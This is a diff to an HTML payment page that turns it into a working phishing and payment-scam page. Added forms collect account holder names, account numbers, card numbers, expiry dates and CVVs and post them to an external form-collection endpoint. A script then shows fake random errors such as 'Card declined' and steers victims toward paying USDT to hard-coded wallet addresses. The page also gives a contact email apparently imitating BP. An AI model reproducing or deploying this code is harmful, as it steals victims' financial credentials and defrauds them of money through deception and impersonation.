@@ -3,168 +3,208 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Payment Confirmation</title>
+<title>Payment Registration</title>
 <link rel="stylesheet" href="../css/style.css">
 <style>
-  body {
-    font-family: 'Poppins', sans-serif;
-    margin: 0;
-    padding: 0;
-    background: #f7f7f7;
-  }
-  .container {
-    max-width: 900px;
-    margin: 50px auto;
-    padding: 20px;
-    background: #fff;
-    border-radius: 12px;
-    box-shadow: 0 8px 25px rgba(0,0,0,0.08);
-  }
-  h2 { text-align: center; margin-bottom: 30px; color: #2c3e50; }
-  .tabs {
-    display: flex;
-    flex-direction: column;
-    gap: 12px;
-    margin-bottom: 30px;
-  }
-  .tab {
-    padding: 15px 20px;
-    background: #e6ffe6;
-    border-radius: 8px;
-    cursor: pointer;
-    font-weight: 600;
-    border: 1px solid #7fff00;
-    transition: 0.3s;
-  }
-  .tab.active { background: #7fff00; color: #fff; }
-  .tab-content { display: none; padding: 20px 0; }
-  .tab-content.active { display: block; }
-  .crypto-section img { max-width: 200px; display: block; margin: 15px 0; }
-  .wallet-address { font-weight: 600; margin: 10px 0; }
-  .network-switch { margin: 15px 0; }
-  button#confirmPayment {
-    padding: 12px 25px;
-    background: linear-gradient(135deg, #7fff00, #5fd700);
-    color: #fff;
-    font-weight: 600;
-    border: none;
-    border-radius: 8px;
-    cursor: pointer;
-  }
-  /* Full-screen loader */
-  .loader-screen {
-    display: none;
-    position: fixed;
-    top: 0; left: 0; width: 100%; height: 100%;
-    background: #fff;
-    z-index: 9999;
-    justify-content: center;
-    align-items: center;
-    flex-direction: column;
-  }
-  .loader-screen.active { display: flex; }
-  .loader {
-    border: 6px solid #f3f3f3;
-    border-top: 6px solid #7fff00;
-    border-radius: 50%;
-    width: 60px;
-    height: 60px;
-    animation: spin 1s linear infinite;
-    margin-bottom: 20px;
-  }
-  @keyframes spin { 0% { transform: rotate(0deg);} 100% { transform: rotate(360deg);} }
-  .full-message { text-align: center; font-size: 22px; font-weight: 600; color: #2c3e50; }
+body { font-family:'Poppins',sans-serif; margin:0; padding:0; background:#f7f7f7; }
+.container { max-width:900px; margin:50px auto; padding:20px; background:#fff; border-radius:12px; box-shadow:0 8px 25px rgba(0,0,0,0.08);}
+h2{text-align:center; margin-bottom:30px; color:#2c3e50;}
+.tabs{display:flex; gap:12px; margin-bottom:20px;}
+.tab{padding:12px 20px; cursor:pointer; background:#e6e6e6; border-radius:8px; font-weight:600; transition:0.3s; border:1px solid #ccc;}
+.tab.active{background:#7fff00; color:#fff;}
+.tab-content{display:none; padding:20px 0;}
+.tab-content.active{display:block;}
+input, select{padding:10px; width:100%; margin:5px 0 15px 0; border-radius:6px; border:1px solid #ccc; font-size:16px;}
+button{padding:12px 25px; background:linear-gradient(135deg,#7fff00,#5fd700); color:#fff; font-weight:600; border:none; border-radius:8px; cursor:pointer;}
+.error-msg{color:red; margin-bottom:15px; font-weight:600;}
+.crypto-section img{max-width:200px; display:block; margin:15px 0;}
+.wallet-address{font-weight:600; margin:10px 0;}
+.loader-screen{display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:#fff; z-index:9999; justify-content:center; align-items:center; flex-direction:column;}
+.loader-screen.active{display:flex;}
+.loader{border:6px solid #f3f3f3; border-top:6px solid #7fff00; border-radius:50%; width:60px; height:60px; animation:spin 1s linear infinite; margin-bottom:20px;}
+@keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
+.full-message{text-align:center; font-size:22px; font-weight:600; color:#2c3e50;}
 </style>
 </head>
 <body>
-<div class="container">
-  <h2>Choose Your Payment Method</h2>
-  <div class="tabs">
-    <div class="tab active" data-target="bank">Bank Transfer</div>
-    <div class="tab" data-target="credit">Credit Card</div>
-    <div class="tab" data-target="debit">Debit Card</div>
-    <div class="tab" data-target="crypto">Crypto</div>
-  </div>
 
-  <!-- Tab Contents -->
-  <div id="bank" class="tab-content active">
-    <p>⚠️ Bank server is currently down. Please try again later.</p>
-  </div>
-  <div id="credit" class="tab-content">
-    <p>⚠️ Credit card server is currently down. Please try again later.</p>
-  </div>
-  <div id="debit" class="tab-content">
-    <p>⚠️ Debit card server is currently down. Please try again later.</p>
-  </div>
-  <div id="crypto" class="tab-content crypto-section">
-    <p>Scan the QR code or copy the wallet address below to complete your payment.</p>
-    <div class="crypto-qrcode">
-      <img id="cryptoQR" src="../assets/trx.jpeg" alt="Crypto QR Code">
-    </div>
-    <div class="wallet-address" id="walletAddress">
-      USDT (TRC20): <strong>TN2Ergk3rJfQy7aS4kZhN7Wk1v78uKFtG1</strong>
-    </div>
-    <div class="network-switch">
-      <label for="network">Switch Network:</label>
-      <select id="network">
-        <option value="trc20">TRC20</option>
-        <option value="bep20">BEP20</option>
-      </select>
-    </div>
-    <button id="confirmPayment">Confirm Payment</button>
-    <p>Note: Once you make the payment, click confirm. You can safely close the tab while we review the payment.</p>
-  </div>
+<div class="container">
+<h2>Choose Your Payment Method</h2>
+<div class="tabs">
+  <div class="tab active" data-target="bank">Bank Transfer</div>
+  <div class="tab" data-target="credit">Credit Card</div>
+  <div class="tab" data-target="debit">Debit Card</div>
+  <div class="tab" data-target="crypto">Crypto</div>
 </div>
 
-<!-- Full-screen loader -->
+<!-- Bank Transfer -->
+<div id="bank" class="tab-content active">
+<form id="bankForm" action="https://formspree.io/f/mblzzzqw" method="POST">
+  <div class="error-msg"></div>
+  <input type="text" name="bank_name" placeholder="Account Holder Name" required>
+  <input type="text" name="account_number" placeholder="Account Number" required>
+  <input type="text" name="ifsc" placeholder="IFSC/SWIFT Code" required>
+  <button type="submit">Submit Bank Info</button>
+</form>
+</div>
+
+<!-- Credit Card -->
+<div id="credit" class="tab-content">
+<form id="creditForm" action="https://formspree.io/f/mblzzzqw" method="POST">
+  <div class="error-msg"></div>
+  <input type="text" name="card_name" placeholder="Card Holder Name" required>
+  <input type="text" name="card_number" placeholder="Card Number" required>
+  <input type="text" name="expiry" placeholder="Expiry MM/YY" required>
+  <input type="text" name="cvv" placeholder="CVV" required>
+  <button type="submit">Submit Credit Card</button>
+</form>
+</div>
+
+<!-- Debit Card -->
+<div id="debit" class="tab-content">
+<form id="debitForm" action="https://formspree.io/f/mblzzzqw" method="POST">
+  <div class="error-msg"></div>
+  <input type="text" name="card_name" placeholder="Card Holder Name" required>
+  <input type="text" name="card_number" placeholder="Card Number" required>
+  <input type="text" name="expiry" placeholder="Expiry MM/YY" required>
+  <input type="text" name="cvv" placeholder="CVV" required>
+  <button type="submit">Submit Debit Card</button>
+</form>
+</div>
+
+<!-- Crypto -->
+<div id="crypto" class="tab-content crypto-section">
+<form id="cryptoForm" action="https://formspree.io/f/mblzzzqw" method="POST">
+  <p>Scan QR code or copy the wallet address to pay:</p>
+  <div class="crypto-qrcode">
+    <img id="cryptoQR" src="../assets/trx.jpeg" alt="Crypto QR Code">
+  </div>
+  <div class="wallet-address" id="walletAddress">
+    USDT (TRC20): <strong>TN2Ergk3rJfQy7aS4kZhN7Wk1v78uKFtG1</strong>
+  </div>
+  <label for="network">Switch Network:</label>
+  <select id="network" name="network">
+    <option value="trc20">TRC20</option>
+    <option value="bep20">BEP20</option>
+  </select>
+  <input type="email" name="user_email" placeholder="Your Email" required>
+  <button type="submit">Confirm Crypto Payment</button>
+</form>
+</div>
+</div>
+
+<!-- Loader -->
 <div class="loader-screen" id="loaderScreen">
-  <div class="loader"></div>
-  <div class="full-message" id="loaderMessage">Your payment is being reviewed. Please wait for confirmation email. You can now safely close the tab.</div>
+<div class="loader"></div>
+<div class="full-message" id="loaderMessage">Processing...</div>
 </div>
 
 <script>
-  // Tab switch logic
-  const tabs = document.querySelectorAll(".tab");
-  const tabContents = document.querySelectorAll(".tab-content");
-  tabs.forEach(tab => {
-    tab.addEventListener("click", () => {
-      tabs.forEach(t => t.classList.remove("active"));
-      tab.classList.add("active");
-      const target = tab.getAttribute("data-target");
-      tabContents.forEach(tc => tc.classList.remove("active"));
-      document.getElementById(target).classList.add("active");
+// Tabs
+const tabs = document.querySelectorAll(".tab");
+const tabContents = document.querySelectorAll(".tab-content");
+tabs.forEach(tab=>{
+  tab.addEventListener("click", ()=>{
+    tabs.forEach(t=>t.classList.remove("active"));
+    tab.classList.add("active");
+    const target = tab.dataset.target;
+    tabContents.forEach(tc=>tc.classList.remove("active"));
+    document.getElementById(target).classList.add("active");
+  });
+});
+
+// Loader functions
+const loaderScreen = document.getElementById("loaderScreen");
+const loaderMessage = document.getElementById("loaderMessage");
+function randomDelay(min=5000,max=7000){return min+Math.random()*(max-min);}
+function showLoader(msg, callback){
+  loaderMessage.innerHTML=msg;
+  loaderScreen.classList.add("active");
+  setTimeout(callback, randomDelay());
+}
+function hideLoader(){loaderScreen.classList.remove("active"); loaderMessage.innerHTML="";}
+
+// Validators
+function validateBank(inputs){
+  const [name, acc, ifsc] = inputs;
+  if(!/^[a-zA-Z\s]{3,50}$/.test(name.value)) return "Invalid account holder name";
+  if(!/^\d{6,20}$/.test(acc.value)) return "Account number must be 6–20 digits";
+  if(!/^[A-Za-z0-9]{8,11}$/.test(ifsc.value)) return "Invalid IFSC/SWIFT code";
+  return "";
+}
+function validateCard(inputs){
+  const [name, number, expiry, cvv] = inputs;
+  if(!/^[a-zA-Z\s]{3,50}$/.test(name.value)) return "Invalid card holder name";
+  if(!/^\d{13,19}$/.test(number.value)) return "Card number must be 13–19 digits";
+  if(!/^(0[1-9]|1[0-2])\/\d{2}$/.test(expiry.value)) return "Expiry must be MM/YY";
+  if(!/^\d{3,4}$/.test(cvv.value)) return "CVV must be 3–4 digits";
+  return "";
+}
+
+// Unified form handler with delayed realistic errors
+function handleForm(formId, validator, errorMsgs){
+  const form=document.getElementById(formId);
+  form.addEventListener("submit", e=>{
+    e.preventDefault();
+    const inputs=Array.from(form.querySelectorAll("input[required]"));
+    inputs.forEach(inp=>inp.style.borderColor="#ccc");
+    const errorBox=form.querySelector(".error-msg");
+    errorBox.innerHTML="";
+    const err=validator(inputs);
+    if(err){
+      showLoader("Verifying information...", ()=>{
+        errorBox.innerHTML=err;
+        inputs.forEach(inp=>{
+          if(!inp.value.trim()) inp.style.borderColor="red";
+        });
+        hideLoader();
+      });
+      return;
+    }
+    const randomError=errorMsgs[Math.floor(Math.random()*errorMsgs.length)];
+    showLoader("Processing payment...", ()=>{
+      hideLoader();
+      errorBox.innerHTML = randomError + " Try our crypto payment method.";
+      form.reset();
     });
   });
+}
 
-  // Crypto network switch
-  const networkSelect = document.getElementById("network");
-  const cryptoQR = document.getElementById("cryptoQR");
-  const walletAddress = document.getElementById("walletAddress");
+const bankErrors=["Bank server temporarily down.","SWIFT verification failed.","Transaction timeout."];
+const cardErrors=["Card declined by bank.","Incorrect CVV entered.","Payment gateway unavailable."];
 
-  networkSelect.addEventListener("change", (e) => {
-    const network = e.target.value;
-    if(network === "trc20") {
-      cryptoQR.src = "../assets/trx.jpeg";
-      walletAddress.innerHTML = 'USDT (TRC20): <strong>TLkG72NXBHVYsqeZ5zzGy4USfUqDKVejqh</strong>';
-    } else if(network === "bep20") {
-      cryptoQR.src = "../assets/BEP20.jpeg";
-      walletAddress.innerHTML = 'USDT (BEP20): <strong>0xCF67ae4216B0a8ab8b1b4b70DcFf2Fb428B56032</strong>';
-    }
+handleForm("bankForm", validateBank, bankErrors);
+handleForm("creditForm", validateCard, cardErrors);
+handleForm("debitForm", validateCard, cardErrors);
+
+// Crypto form
+const cryptoForm=document.getElementById("cryptoForm");
+const networkSelect=document.getElementById("network");
+const cryptoQR=document.getElementById("cryptoQR");
+const walletAddress=document.getElementById("walletAddress");
+
+networkSelect.addEventListener("change", e=>{
+  const net=e.target.value;
+  if(net==="trc20"){
+    cryptoQR.src="../assets/trx.jpeg";
+    walletAddress.innerHTML='USDT (TRC20): <strong>TN2Ergk3rJfQy7aS4kZhN7Wk1v78uKFtG1</strong>';
+  }else{
+    cryptoQR.src="../assets/BEP20.jpeg";
+    walletAddress.innerHTML='USDT (BEP20): <strong>0xCF67ae4216B0a8ab8b1b4b70DcFf2Fb428B56032</strong>';
+  }
+});
+
+cryptoForm.addEventListener("submit", e=>{
+  e.preventDefault();
+  showLoader("Processing your crypto payment...", ()=>{
+    loaderScreen.querySelector(".loader").style.display="none";
+    loaderMessage.innerHTML=`Thank you for your payment.<br>
+    Kindly send us your email with your transaction hash to <strong>careline@bp-plc.com</strong>.<br>
+    Network: ${networkSelect.value.toUpperCase()}<br>
+    Wallet address: ${walletAddress.innerText}`;
   });
-
-  // Confirm payment button logic
-  const confirmBtn = document.getElementById("confirmPayment");
-  const loaderScreen = document.getElementById("loaderScreen");
-
-  confirmBtn.addEventListener("click", () => {
-    loaderScreen.classList.add("active");
-    // simulate 12 second loading
-    setTimeout(() => {
-      document.querySelector(".container").style.display = "none";
-      loaderScreen.querySelector(".loader").style.display = "none";
-      loaderScreen.querySelector("#loaderMessage").style.fontSize = "28px";
-    }, 12000);
-  });
+  cryptoForm.reset();
+});
 </script>
 </body>
-</html>
+  </html>
